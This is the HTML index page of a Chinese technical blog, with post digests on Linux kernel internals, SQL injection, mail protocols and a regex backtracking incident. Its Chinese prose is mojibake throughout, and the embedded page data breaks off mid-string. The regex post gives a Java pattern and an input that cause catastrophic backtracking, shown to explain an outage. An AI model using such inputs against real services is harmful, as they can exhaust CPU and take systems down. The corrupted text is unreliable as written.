<!DOCTYPE html><html><head><meta charSet="utf-8" class="next-head"/><meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1" class="next-head"/><link rel="preload" href="https://www.ffutop.com/blog/_next/static/hWdi76oEOpYyIRDBQu5ce/pages/index.js" as="script"/><link rel="preload" href="https://www.ffutop.com/blog/_next/static/hWdi76oEOpYyIRDBQu5ce/pages/_app.js" as="script"/><link rel="preload" href="https://www.ffutop.com/blog/_next/static/runtime/webpack-8ed9452df514b4d17d80.js" as="script"/><link rel="preload" href="https://www.ffutop.com/blog/_next/static/chunks/commons.969aa7fdf03e14118a99.js" as="script"/><link rel="preload" href="https://www.ffutop.com/blog/_next/static/chunks/styles.f3603d0a56c82c4f5e78.js" as="script"/><link rel="preload" href="https://www.ffutop.com/blog/_next/static/runtime/main-3daabeb1dde7624c7fe0.js" as="script"/><link rel="stylesheet" href="https://www.ffutop.com/blog/_next/static/css/commons.00f35eb3.chunk.css"/><link rel="stylesheet" href="https://www.ffutop.com/blog/_next/static/css/styles.55a7521e.chunk.css"/></head><body><div id="__next"><header class="component-header"><h1 class="title">ffutop</h1><ul class="nav-items"><li><a href="/blog/index">åšå®¢</a></li><li><a href="/blog/archives">å½’æ¡£</a></li><li><a href="/blog/tags">æ ‡ç­¾</a></li><li><a href="/blog/about">å…³äº</a></li></ul></header><div><main class="main"><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2019-01-15-understand-Kernel-8"></a></h1><div><p>title: ç†è§£ Linux Kernel (8) - ç½‘ç»œ
author: fangfeng
date: 2019-01-15
tags:</p>
<ul>
<li>Linux</li>
<li>Kernel</li>
<li>Network</li>
</ul>
<hr></div><p><a href="/blog/2019-01-15-understand-Kernel-8">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2018-12-28-understand-Kernel-7">ç†è§£ Linux Kernel (7) - å­—ç¬¦è®¾å¤‡</a></h1><div><p>ç›¸æ¯”è¾ƒäºå—è®¾å¤‡ï¼Œå­—ç¬¦è®¾å¤‡æ— è®ºä»ç‰©ç†è®¤çŸ¥ä¸Šï¼ŒæŠ‘æˆ–æ˜¯ç†è®ºç†è§£ä¸Šï¼Œéƒ½å­˜åœ¨ç€ç›¸å½“å¤§çš„å…¥é—¨é—¨æ§›ã€‚ç‰¹åˆ«æ˜¯åœ¨å°†å­—ç¬¦è®¾å¤‡ä¸æ§åˆ¶å°ã€å‘½ä»¤è¡Œç»ˆç«¯æ··æ·†çš„æ—¶å€™ï¼Œå°±æ›´åŠ éš¾ä»¥è¿›è¡Œåˆ†è¾¨äº†ã€‚</p>
<p>å›åˆ°å­—ç¬¦è®¾å¤‡æœ¬èº«ï¼Œå­—ç¬¦è®¾å¤‡ä¸å—è®¾å¤‡æœ€ä¸»è¦çš„åŒºåˆ«å°±åœ¨äºå—è®¾å¤‡å¯ä»¥éšæœºè¯»å†™ï¼Œè€Œå­—ç¬¦è®¾å¤‡åªèƒ½å¤Ÿé¡ºåºè¯»ï¼Œé¡ºåºå†™ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¸¸è§çš„å­—ç¬¦è®¾å¤‡æœ‰ä»€ä¹ˆï¼Ÿæ˜¾ç¤ºå™¨ã€é”®ç›˜ã€é¼ æ ‡ã€‚</p></div><p><a href="/blog/2018-12-28-understand-Kernel-7">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2018-12-15-sql-injection">SQL æ³¨å…¥</a></h1><div><p>è¯´å®è¯æ­¤å‰å¯¹ SQL æ³¨å…¥çš„ç†è§£ä»…ä»…åªæ˜¯çš®æ¯›ã€‚å½“ç„¶ï¼Œç›®å‰ä¹Ÿæ˜¯ï¼Œåªæ˜¯æœ‰äº†ä¸€å®šç¨‹åº¦çš„ç†è§£ã€‚</p>
<p>æœ€è¿‘å¥½åƒå·¥å…·ç”¨å¾—æœ‰äº›è¿‡å¤´äº†ï¼Œéœ€è¦åœä¸‹æ¥æ•´ç†ä¸‹å·¥å…·çš„å®ç°åŸç†ã€‚</p>
<p>æ›´å¥½åœ°ç†è§£äº†å·¥å…·å®ç°ï¼Œæ‰èƒ½æ›´åŠ å¿ƒå®‰ç†å¾—åœ°ä½¿ç”¨å·¥å…·ã€‚æ¯•ç«Ÿç­‰åˆ«äººæ€¼çš„æ—¶å€™ï¼Œè¿˜èƒ½å¤Ÿæ¯”è¾ƒå®‰å¿ƒåœ°å›é“: "æˆ‘ç”¨ä¸ç”¨ç°æˆçš„å·¥å…·åªæ˜¯å–å†³äºæˆ‘æƒ³ä¸æƒ³è‡ªå·±å†å†™ä¸€å¥—"</p>
<p>å½“ç„¶ï¼Œæ¯•ç«Ÿæˆç†Ÿçš„å·¥å…·æœ‰æ›´å¤šçš„ä¼˜åŒ–ï¼Œè¿™å°±ä¸æ˜¯çŸ­æ—¶é—´å†…æˆ‘æƒ³ä¸æƒ³è‡ªå·±å†™çš„é—®é¢˜äº†ï¼Œå“ˆå“ˆã€‚</p></div><p><a href="/blog/2018-12-15-sql-injection">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2018-11-16-regex-exponential-explosion">æ­£åˆ™è¡¨è¾¾å¼æŒ‡æ•°çˆ†ç‚¸</a></h1><div><h2>èƒŒæ™¯</h2>
<p>æ˜¨å¤©æ¥è§¦åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜, å…¬å¸æµ‹è¯•ç¯å¢ƒä¸€å°æœºå™¨ CPU è·‘åˆ°äº† 400%ï¼Œå¯¼è‡´è¯¥æœºå™¨ä¸Šçš„æ‰€æœ‰æœåŠ¡éƒ½æŒ‚æ‰äº†ã€‚</p>
<p>æœ€åæŸ¥åˆ°çš„åŸå› ç«Ÿç„¶æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ‰€å¼•èµ·çš„ï¼Œå¤§å¤§å‡ºä¹æ„æ–™å•Šã€‚è™½ç„¶æ—©å°±çŸ¥é“æ­£åˆ™æ•ˆç‡å¾ˆå·®ï¼Œä½†ç»å¯¹æ²¡æœ‰æƒ³åˆ°ä¼šå¯¼è‡´æ•´ä¸ªæœºå™¨ä¸ŠæœåŠ¡å´©æºƒçš„æƒ…å†µã€‚</p>
<p>å…ˆç®€å•å±•ç¤ºä¸‹é—®é¢˜æ­£åˆ™:</p>
<pre><code class="language-java">String regex = "(\\w+,?)+";
String val = "abcdefghijklmno,abcdefghijklmno+";
System.out.println(val.matches(regex));
</code></pre>
<p>æœ€ç»ˆçš„æ‰§è¡Œæ—¶é—´æ˜¯ 17s å·¦å³ã€‚</p>
<p>ç›¸åï¼Œå¦‚æœæ”¹æˆ <code>String val = "abcdefghijklmno,abcdefghijklmno"</code> ï¼Œå®é™…æ‰§è¡Œæ—¶é—´ 1ms å·¦å³ã€‚</p>
<p>å“ˆå“ˆï¼Œå®Œå…¨ä¸æ˜¯ä¸€ä¸ªé‡çº§çš„ç»“æœã€‚</p>
<p>æœ€åï¼Œå½“ç„¶æ˜¯è¦æ‰¾åŸå› äº†:&#x3C; å½“ç„¶ï¼Œæœ‰å…¶å®ƒé‡è¦çš„äº‹åœ¨è€½æï¼Œæ²¡æ—¶é—´å»çœ‹ Java Regex æºç ã€‚ä¸è¿‡ï¼Œä»æ­£åˆ™æœ¬èº«ä¸‹æ‰‹åè€Œæ˜¯ä¸ªå¥½äº‹æƒ…ã€‚æ¯•ç«Ÿå‡ ä¹æ‰€æœ‰çš„ç¼–ç¨‹è¯­è¨€éƒ½æœ‰å¯¹æ­£åˆ™çš„æ”¯æŒã€‚è€ŒåŒæ ·çš„ï¼Œéƒ½å­˜åœ¨ç€è¿™æ ·çš„é—®é¢˜ã€‚é‚£å°±å¯ä»¥å¤§èƒ†çŒœæƒ³å…¶å®æ˜¯å’Œè¯­è¨€æœ¬èº«æ— å…³ï¼Œè€Œåœ¨äºæ­£åˆ™è§„èŒƒæœ¬èº«äº†ã€‚</p>
<p>å…ˆç»™ä¸ªç»“æœï¼Œç½ªé­ç¥¸é¦–å°±æ˜¯<code>æŒ‡æ•°çˆ†ç‚¸</code></p></div><p><a href="/blog/2018-11-16-regex-exponential-explosion">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2018-11-11-understand-Kernel-6">ç†è§£ Linux Kernel (6) - read &amp; write</a></h1><div><p><a href="https://dormouse-none.github.io/2018-10-14-understand-Kernel-5/">å‰ä¸€ç¯‡</a>å·²ç»æè¿°å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œäº†å®è§‚æ€§çš„æè¿°ï¼Œè¿™ä¸€ç¯‡ï¼Œå°†ä»¥ç‰¹å®šçš„æ–‡ä»¶è¯»å†™æ“ä½œä¸ºç¤ºä¾‹ï¼Œä¸²è”å¯¹æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„åŸºæœ¬æ“ä½œã€‚</p>
<p>é¦–å…ˆå…ˆæ¥çœ‹çœ‹å¹³å°ç›¸å…³çš„æ–‡ä»¶è¯»å†™æ“ä½œçš„ C ä»£ç æ˜¯æ€æ ·ä¸€ä¸ªè°ƒç”¨æ–¹å¼</p>
<pre><code class="language-c">#include &#x3C;stdio.h>
#include &#x3C;stdlib.h>
#include &#x3C;string.h>
#include &#x3C;unistd.h>
#include &#x3C;fcntl.h>
#include &#x3C;errno.h>
#include &#x3C;sys/types.h>
#include &#x3C;sys/stat.h>

int panic()
{
    fprintf(stderr, "%s (errno=%d)\n", strerror(errno), errno);
    return -1;
}

int main(int argc, char *argv[])
{
    /* æ‰“å¼€æ–‡ä»¶ frw.txt (ä»¥å¯è¯»å†™ | è‹¥ä¸å­˜åœ¨åˆ™æ–°å»ºçš„å½¢å¼) */
    int fd = open("/root/frw.txt", O_RDWR | O_CREAT);
    if (fd == -1)
        return panic();

    /* å‘æ–‡ä»¶å†™å…¥ Hello World! å…±è®¡ 12 ä¸ªå­—ç¬¦ */
    ssize_t wsize = write(fd, "Hello World!", 12);
    if (wsize == -1)
        return panic();

    /* é‡å®šä½æ–‡ä»¶è¯»å†™æŒ‡é’ˆ */
    off_t off = lseek(fd, 0, SEEK_SET);
    if (off == -1)
        return panic();

    char* buf = (char *) malloc(wsize);
    /* è¯»å–æ–‡ä»¶å†…å®¹ */
    ssize_t rsize = read(fd, buf, wsize);
    if (rsize == -1)
        return panic();

    printf("%s\n", buf);
    free(buf);
    /* å…³é—­æ–‡ä»¶ */
    int stat = close(fd);
    if (stat == -1)
        return panic();

    return 0;
}
</code></pre></div><p><a href="/blog/2018-11-11-understand-Kernel-6">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2018-10-14-understand-Kernel-5">ç†è§£ Linux Kernel (5) - æ–‡ä»¶ç³»ç»Ÿ(å®è§‚æè¿°)</a></h1><div><p>ç”¨æƒ¯äº†ç±» Unix ç³»ç»Ÿï¼Œåº”è¯¥è¯´æ–‡ä»¶ç³»ç»Ÿæ˜¯æ—¥å¸¸æœ€å¸¸æ¥è§¦çš„ä¸€ä¸ªæ“ä½œç³»ç»Ÿæ¨¡å—ä¹‹ä¸€äº†ã€‚</p>
<pre><code class="language-shell">$ ls
Applications Network      Users        bin          data         etc          net          sbin         usr
Library      System       Volumes      cores        dev          home         private      tmp          var
</code></pre>
<p>ä½†æ˜¯ï¼Œç©¶ç«Ÿä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿ? ä¸ºä»€ä¹ˆéœ€è¦æ–‡ä»¶ç³»ç»Ÿ? éš¾é“æ–‡ä»¶ä¸æ˜¯ç®€å•åœ°å­˜å‚¨åˆ°å­˜å‚¨è®¾å¤‡ä¸€å—è¿ç»­åŒºåŸŸçš„å—?</p></div><p><a href="/blog/2018-10-14-understand-Kernel-5">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2018-10-12-understand-Kernel-4">ç†è§£ Linux Kernel (4) - ä»»åŠ¡è°ƒåº¦</a></h1><div><p>å‰é¢å‡ èŠ‚å·²ç»æè¿°è¿‡ï¼Œå¯¹äºå•æ ¸ CPU æ¥è¯´ã€‚CPU å°±å¤„äºä¸æ–­åœ°æ‰§è¡ŒæŒ‡ä»¤çš„è¿‡ç¨‹(æˆ–è€…é€šè¿‡ <code>hlt</code> æŒ‡ä»¤ç›´æ¥åœæ­¢å·¥ä½œ)ã€‚</p>
<p>é’ˆå¯¹äºæ¯ä¸€ä¸ªç¨‹åºæ¥è¯´ï¼Œè¿™ä¸ªç¨‹åºæ‰§è¡Œæµç¨‹æ˜¯é€šè¿‡ CPU ä¸­å‡ ç»„å¯„å­˜å™¨(é€šç”¨å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨ã€æ§åˆ¶å¯„å­˜å™¨ç­‰) å’Œå­˜å‚¨åœ¨å†…å­˜ä¸­çš„ä»£ç å’Œæ•°æ®åä½œå®Œæˆçš„ã€‚</p>
<p>å¦‚æœè¦è¾¾åˆ°å•æ ¸å¤šä»»åŠ¡çš„ç›®çš„ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯å®Œæˆå¯¹å‡ ç»„å¯„å­˜å™¨ä¸­å½“å‰å€¼çš„ä¿å­˜(æˆ‘ç§°ä¹‹ä¸ºä¿å­˜ç°åœº)ã€‚è€Œå¯¹äºå†…å­˜æ¥è¯´ï¼Œå¤šä¸ªä»»åŠ¡çš„ä»£ç ã€æ•°æ®åŒæ—¶å­˜åœ¨å†…å­˜æ˜¯å®Œå…¨åˆç†ä¸”å¯è¡Œçš„ã€‚æ¯•ç«Ÿç›¸è¾ƒäºæœ‰é™çš„å¯„å­˜å™¨ï¼Œå†…å­˜å®åœ¨æ˜¯å¤ªå¤§äº†(ç›¸å¯¹è€Œè¨€)ã€‚</p></div><p><a href="/blog/2018-10-12-understand-Kernel-4">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2018-10-06-understand-Kernel-3">ç†è§£ Linux Kernel (3) - æ“ä½œç³»ç»Ÿå¯åŠ¨</a></h1><div><p>è¿™æ¬¡æ‹–å¾—æœ‰å¤Ÿä¹…çš„ï¼Œæ¯•ç«Ÿéœ€è¦å°†çŸ¥è¯†ä¸²è”èµ·æ¥å¹¶ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚æ›´ä½•å†µå¾ˆå¤šå†…å®¹å¯ä»¥è¯´å’Œå¸¸ç†(ä¸ªäººç†è§£çš„å¸¸ç†)æœ‰äº†æ¯”è¾ƒå¤§çš„åå·®ã€‚</p>
<p>ä¸è¿‡ç¡®å®æ¯”è¾ƒæœ‰æ„æ€ã€‚ä»å¼•å¯¼ç¨‹åºåˆ°æ“ä½œç³»ç»Ÿå¯åŠ¨ï¼Œè¿™ä¸­é—´ç©¶ç«Ÿç»å†äº†å¤šå°‘æµç¨‹å‘¢ï¼Ÿ</p>
<p>ç”±äºæœ‰äº†å‰å‡ èŠ‚çš„å†…å®¹ï¼Œè¿™é‡Œä¸ä¼šå†å¯¹å¼•å¯¼ç¨‹åºåŠæ±‡ç¼–è¯­æ³•åšè¿‡å¤šçš„ä»‹ç»ã€‚è€Œç€é‡åœ¨äºæ•´ä¸ªæµç¨‹çš„æè¿°ã€‚</p></div><p><a href="/blog/2018-10-06-understand-Kernel-3">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div><div class="component-post-digest"><h1 class="title"><a href="/blog/2018-09-27-mail">Understand MAIL</a></h1><div><p>åœ¨ç½‘ç»œåè®®ä¸Šï¼Œé«˜å±‚åè®®ç¡®å®æ¯”åº•å±‚åè®®æ›´å®¹æ˜“ç†è§£ï¼Œä¹Ÿæ›´åŠ çš„äººæ€§åŒ–ã€‚
ä¼ è¾“å±‚çš„ TCP, UDP éƒ½è¿˜åœç•™åœ¨å„ç§å­—èŠ‚å†…å®¹çš„æ•´åˆå’Œæ ¡éªŒä¸Šï¼Œè€Œæ›´ä¸Šå±‚çš„åº”ç”¨å±‚åè®®å°±å·²ç»èƒ½å¤Ÿç›´è§‚åˆ°é€šè¿‡ç›´æ¥è§£è¯»å°±èƒ½ç†è§£å…¶æ¯æ¡æ¶ˆæ¯çš„å«ä¹‰äº†ã€‚</p></div><p><a href="/blog/2018-09-27-mail">é˜…è¯»æ›´å¤š</a></p><hr/></div></div><div class="component-page-turner"><a href="/blog/page/1">ä¸Šä¸€é¡µ</a><a href="/blog/page/3">ä¸‹ä¸€é¡µ</a></div></main><footer class="footer">ffutop Â© <!-- -->2019<!-- -->, Powered byÂ <a href="https://reactjs.org/">React</a>Â andÂ <a href="https://nextjs.org/">Next.js</a></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"dataManager":"[]","props":{"pageProps":{}},"page":"/","query":{"mdDatasParts":[{"url":"2019-01-15-understand-Kernel-8","fileName":"2019-01-15-understand-Kernel-8.md","content":"\u003cp\u003etitle: ç†è§£ Linux Kernel (8) - ç½‘ç»œ\nauthor: fangfeng\ndate: 2019-01-15\ntags:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLinux\u003c/li\u003e\n\u003cli\u003eKernel\u003c/li\u003e\n\u003cli\u003eNetwork\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e","digest":"\u003cp\u003etitle: ç†è§£ Linux Kernel (8) - ç½‘ç»œ\nauthor: fangfeng\ndate: 2019-01-15\ntags:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLinux\u003c/li\u003e\n\u003cli\u003eKernel\u003c/li\u003e\n\u003cli\u003eNetwork\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e"},{"url":"2018-12-28-understand-Kernel-7","fileName":"2018-12-28-understand-Kernel-7.md","title":"ç†è§£ Linux Kernel (7) - å­—ç¬¦è®¾å¤‡","author":"fangfeng","date":"2018-12-28T00:00:00.000Z","tags":["Linux","Kernel","Char Dev"],"content":"\u003cp\u003eç›¸æ¯”è¾ƒäºå—è®¾å¤‡ï¼Œå­—ç¬¦è®¾å¤‡æ— è®ºä»ç‰©ç†è®¤çŸ¥ä¸Šï¼ŒæŠ‘æˆ–æ˜¯ç†è®ºç†è§£ä¸Šï¼Œéƒ½å­˜åœ¨ç€ç›¸å½“å¤§çš„å…¥é—¨é—¨æ§›ã€‚ç‰¹åˆ«æ˜¯åœ¨å°†å­—ç¬¦è®¾å¤‡ä¸æ§åˆ¶å°ã€å‘½ä»¤è¡Œç»ˆç«¯æ··æ·†çš„æ—¶å€™ï¼Œå°±æ›´åŠ éš¾ä»¥è¿›è¡Œåˆ†è¾¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå›åˆ°å­—ç¬¦è®¾å¤‡æœ¬èº«ï¼Œå­—ç¬¦è®¾å¤‡ä¸å—è®¾å¤‡æœ€ä¸»è¦çš„åŒºåˆ«å°±åœ¨äºå—è®¾å¤‡å¯ä»¥éšæœºè¯»å†™ï¼Œè€Œå­—ç¬¦è®¾å¤‡åªèƒ½å¤Ÿé¡ºåºè¯»ï¼Œé¡ºåºå†™ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œå¸¸è§çš„å­—ç¬¦è®¾å¤‡æœ‰ä»€ä¹ˆï¼Ÿæ˜¾ç¤ºå™¨ã€é”®ç›˜ã€é¼ æ ‡ã€‚\u003c/p\u003e\n\u003ch2\u003eå®è§‚æ¦‚è§ˆ\u003c/h2\u003e\n\u003cp\u003eé€šå¸¸åœ¨æˆ‘ä»¬çš„è®¤è¯†ä¸­ï¼Œå‘½ä»¤è¡Œç»ˆç«¯å°±è¢«è®¤ä¸ºæ˜¯ä¸ä¸€å¥—å­—ç¬¦è®¾å¤‡ç›¸é…åˆæ¥ä½¿ç”¨çš„ã€‚å¾ˆæ­£å¸¸å˜›ã€‚æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ª Shell ï¼Œé€šè¿‡é”®ç›˜è¾“å…¥ä¸€äº›å­—ç¬¦ï¼Œé…åˆæ˜¾ç¤ºå™¨æŠŠè¿™äº›ç»è¿‡åŠ å·¥çš„å­—ç¬¦å±•ç¤ºå‡ºæ¥ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œæ˜¯ä¸æ˜¯å°±æ„å‘³ç€ Shell ä½œä¸ºä¸€ä¸ªä»»åŠ¡(è¿›ç¨‹)ï¼Œä»¥é”®ç›˜è®¾å¤‡ä½œä¸ºæ ‡å‡†è¾“å…¥ï¼Œä»¥æ˜¾ç¤ºè®¾å¤‡ä½œä¸ºæ ‡å‡†è¾“å‡º?\u003c/p\u003e\n\u003cp\u003eçœ‹çœ‹ä¸€ä¸ª 1 å·ä»»åŠ¡ \u003ccode\u003e/bin/bash\u003c/code\u003e çš„æ–‡ä»¶æè¿°ç¬¦è¯´æ˜å§ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sh\"\u003e$ ls -al\ntotal 0\ndr-x------ 2 root root  0 Dec 13 23:20 .\ndr-xr-xr-x 9 root root  0 Dec 13 23:20 ..\nlrwx------ 1 root root 64 Dec 13 23:20 0 -\u003e /dev/pts/0\nlrwx------ 1 root root 64 Dec 13 23:20 1 -\u003e /dev/pts/0\nlrwx------ 1 root root 64 Dec 13 23:20 2 -\u003e /dev/pts/0\nlrwx------ 1 root root 64 Dec 25 01:09 255 -\u003e /dev/pts/0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè¿™é‡Œæ–‡ä»¶æè¿°ç¬¦ 0, 1, 2 åˆ†åˆ«è¡¨ç¤ºä»»åŠ¡çš„æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯ã€‚è¿™äº›å†…å®¹åœ¨è¡¨ç°å½¢å¼ä¸Šåšäº†ä¸€ä¸ªé“¾æ¥ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œ\u003ccode\u003e/dev/pts/0\u003c/code\u003e æ˜¯ä»€ä¹ˆ? \u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sh\"\u003ecrw--w---- 1 root tty 136, 0 Dec 13 23:20 /dev/pts/0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eä¸€ä¸ªå­—ç¬¦è®¾å¤‡ã€‚åˆ°æ­¤ä¸ºæ­¢ï¼Œä¼¼ä¹å’Œæœ€åˆé¢„æƒ³çš„æœ‰æ¯”è¾ƒå¤§çš„åŒºåˆ«ã€‚è‡³å°‘åœ¨å‡è±¡ä¸­ï¼Œè‡³å°‘æ˜¯ä¸€ä¸ªè¾“å…¥(é”®ç›˜)ï¼Œä¸€ä¸ªè¾“å‡º(æ˜¾ç¤ºå™¨)ã€‚æ€ä¹ˆå°±æ··æˆäº†ä¸€ä¸ªå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæœ¬æ¥æ˜¯æ€ä¹ˆéƒ½æƒ³ä¸é€šçš„ï¼Œä½†åæ¥é…åˆ\"Unixä¸€åˆ‡çš†æ–‡ä»¶\"çš„ä¿¡æ¡ï¼Œæ€»ç®—æ˜¯æœ‰ç‚¹æ˜ç™½äº†ã€‚\u003c/p\u003e\n\u003cp\u003eç›¸ä¿¡å¤§å®¶éƒ½æœ‰è¿™è¿™æ ·çš„ç»å†ï¼ŒæŸä¸ªç¨‹åºæ˜¯ä»¥é”®ç›˜è¾“å…¥ä½œä¸ºæ ‡å‡†è¾“å…¥çš„ã€‚å…¶å®å°±å’Œä¸Šé¢ğŸ‘†å±•ç¤ºçš„ä¸€æ · \u003ccode\u003e0 -\u003e /dev/pts/0\u003c/code\u003e ã€‚é‚£ä¹ˆï¼Œæœ‰æ²¡æœ‰è€ƒè™‘è¿‡è¿™æ•´å¥—æµç¨‹æ˜¯æ€ä¹ˆåä½œçš„å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://ws4.sinaimg.cn/large/006tNbRwly1fyjvtjiu0zj31980oqmxe.jpg\"\u003e\u003c/p\u003e\n\u003cp\u003eå¯¹äºç¨‹åºæ¥è¯´ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ™®é€šçš„è°ƒç”¨ \u003ccode\u003eread\u003c/code\u003e, \u003ccode\u003ewrite\u003c/code\u003e ç­‰ç»è¿‡å°è£…çš„å‡½æ•°ï¼Œæ¥è¯»å–ä¸€ä¸ªæ‰€è°“çš„æ–‡ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eä½†å¯¹äºæ–‡ä»¶æ˜¯å­—ç¬¦è®¾å¤‡æ—¶ï¼Œæœ€ç»ˆè°ƒç”¨çš„å°±æ˜¯ \u003ccode\u003etty_read\u003c/code\u003e, \u003ccode\u003etty_write\u003c/code\u003e äº†ã€‚é€šä¿—çš„è®²ï¼Œå¤§æ¦‚ç‡çš„å°±æ˜¯é”®ç›˜ä½œä¸ºè¾“å…¥ï¼Œæ˜¾ç¤ºå™¨ä½œä¸ºè¾“å‡ºäº†ã€‚\u003c/p\u003e\n\u003ch2\u003eæºç å‰–æ\u003c/h2\u003e\n\u003ch3\u003eæ–‡ä»¶è¯»å†™\u003c/h3\u003e\n\u003cp\u003eè¿™éƒ¨åˆ†ä¸Šä¸€ç¯‡å·²ç»ä»‹ç»è¿‡äº†ï¼Œä¸åšè¿‡å¤šè¯´æ˜ã€‚\u003c/p\u003e\n\u003cp\u003eç®€å•å›é¡¾ä¸‹ \u003ccode\u003esys_read\u003c/code\u003e å‡½æ•°\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003eint sys_read(unsigned int fd,char * buf,int count)\n{\n    struct file * file;\n    struct m_inode * inode;\n\n    if (fd\u003e=NR_OPEN || count\u0026#x3C;0 || !(file=current-\u003efilp[fd]))\n        return -EINVAL;\n    if (!count)\n        return 0;\n    verify_area(buf,count);\n    inode = file-\u003ef_inode;\n    if (inode-\u003ei_pipe)\n        return (file-\u003ef_mode\u0026#x26;1)?read_pipe(inode,buf,count):-EIO;\n    /* ç¡®è®¤åˆ°ièŠ‚ç‚¹æè¿°çš„æ˜¯å­—ç¬¦è®¾å¤‡ */\n    if (S_ISCHR(inode-\u003ei_mode)) \n        return rw_char(READ,inode-\u003ei_zone[0],buf,count,\u0026#x26;file-\u003ef_pos);\n    if (S_ISBLK(inode-\u003ei_mode))\n        return block_read(inode-\u003ei_zone[0],\u0026#x26;file-\u003ef_pos,buf,count);\n    if (S_ISDIR(inode-\u003ei_mode) || S_ISREG(inode-\u003ei_mode)) {\n        if (count+file-\u003ef_pos \u003e inode-\u003ei_size)\n            count = inode-\u003ei_size - file-\u003ef_pos;\n        if (count\u0026#x3C;=0)\n            return 0;\n        return file_read(inode,file,buf,count);\n    }\n    printk(\"(Read)inode-\u003ei_mode=%06o\\n\\r\",inode-\u003ei_mode);\n    return -EINVAL;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå¯ä»¥çœ‹åˆ° \u003ccode\u003eS_ISCHR()\u003c/code\u003e å°±æ˜¯åœ¨å¯¹ièŠ‚ç‚¹çš„ç±»å‹è¿›è¡Œåˆ¤åˆ«ï¼Œä»è€Œè¿›è¡Œä¸åŒçš„åˆ†å‘ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estatic crw_ptr crw_table[]={\n    NULL,       /* nodev */\n    rw_memory,  /* /dev/mem etc */\n    NULL,       /* /dev/fd */\n    NULL,       /* /dev/hd */\n    rw_ttyx,    /* /dev/ttyx */\n    rw_tty,     /* /dev/tty */\n    NULL,       /* /dev/lp */\n    NULL};      /* unnamed pipes */\n/**\n * è¿™æ®µè¿˜æ˜¯æ¶‰åŠåˆ°åˆ†å‘ï¼Œç”±ä¸åŒçš„è®¾å¤‡å·(dev) æ¥ç¡®å®šæ‰§è¡Œå‡½æ•° (ttyx, ä¸²å£ç»ˆç«¯; tty, æ§åˆ¶å°ç»ˆç«¯; mem, /dev/mem ç­‰)\n * crw_ptr æ˜¯ C è¯­è¨€ä¸­å¸¸è§çš„å‡½æ•°æŒ‡é’ˆã€‚ç”±devå·æ¥ç¡®å®šè°ƒç”¨å“ªä¸ªå‡½æ•°\n */\nint rw_char(int rw,int dev, char * buf, int count, off_t * pos)\n{\n    crw_ptr call_addr;\n\n    if (MAJOR(dev)\u003e=NRDEVS)\n        return -ENODEV;\n    if (!(call_addr=crw_table[MAJOR(dev)]))\n        return -ENODEV;\n    return call_addr(rw,MINOR(dev),buf,count,pos);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæ‰§è¡Œåˆ° \u003ccode\u003erw_tty\u003c/code\u003e, \u003ccode\u003erw_ttyx\u003c/code\u003e ä¸¤ä¸ªå‡½æ•°ï¼Œå°±å°†å¯¹è¯»/å†™è¿›è¡ŒåŒºåˆ†ï¼Œå¹¶ç”±ç‰¹å®šçš„å‡½æ•°è¿›è¡Œå¤„ç†ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003estatic int rw_ttyx(int rw,unsigned minor,char * buf,int count,off_t * pos)\n{\n    return ((rw==READ)?tty_read(minor,buf,count):\n        tty_write(minor,buf,count));\n}\n\nstatic int rw_tty(int rw,unsigned minor,char * buf,int count, off_t * pos)\n{\n    if (current-\u003etty\u0026#x3C;0)\n        return -EPERM;\n    return 